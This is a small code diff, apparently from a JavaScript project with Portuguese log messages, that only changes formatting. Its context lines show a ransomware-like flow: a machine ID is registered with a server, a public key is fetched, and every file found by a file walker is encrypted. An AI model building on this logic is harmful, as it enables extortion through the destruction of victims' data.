@@ -15,7 +15,7 @@ const waitThenDo = async () => {
   console.log('Vou dormir');
   await sleep(1000 * 5);
   console.log('Acordei');
-}
+};
 
 async function main() {
   let system = MachineManager.loadId();
@@ -25,8 +25,9 @@ async function main() {
       system = MachineManager.generateId();
 
       const { publicKey } = await connection.registerMachine(system);
+
       const fileEncrypter = Encrypter(publicKey);
-      
+
       lukeFileWalker(filename => {
         worker(filename, fileEncrypter);
       });
